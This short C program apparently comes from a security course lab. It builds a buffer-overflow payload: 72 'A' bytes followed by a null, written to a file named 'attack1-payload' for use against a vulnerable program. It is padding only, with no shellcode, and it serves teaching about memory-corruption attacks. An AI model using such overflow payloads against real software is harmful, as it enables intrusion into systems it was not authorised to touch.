#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "util-program.h"


int main(int argc, char **argv)
{
    /* YOUR CODE: Generate buf appropriately */
    int buffer_length=74;
    char buffer[buffer_length];
//    buffer= "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";
    int i=0;
	for (i=0;i< buffer_length-2;i++){
		buffer[i]='A';
	}
   buffer[72]=(char)0 ;
   
    
    write_to_file( "attack1-payload", buffer, buffer_length , FILE_CLEAR );
    exit(0);
}
